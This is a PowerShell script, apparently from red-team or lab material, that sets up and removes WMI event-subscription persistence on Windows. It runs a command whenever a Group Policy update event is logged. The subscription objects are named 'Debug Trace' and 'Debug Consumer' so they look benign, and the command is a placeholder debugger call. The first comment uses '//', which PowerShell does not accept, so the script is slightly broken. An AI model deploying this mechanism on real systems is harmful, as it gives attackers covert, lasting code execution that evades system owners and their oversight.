// this will trigger when the computer updates its Group Policy Objects.
function Add-WmiPersistence
{
   $EventFilterArgs = @{
      EventNamespace = 'root/cimv2'
      Name = "Debug Trace"
      Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
      QueryLanguage = 'WQL'
   }

   $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

   $CommandLineConsumerArgs = @{
      Name = "Debug Consumer"
      CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
   }

   $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

   $FilterToConsumerArgs = @{
      Filter = $Filter
      Consumer = $Consumer
   }

   Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
}

function Remove-WmiPersistence
{
    Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
    Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
}
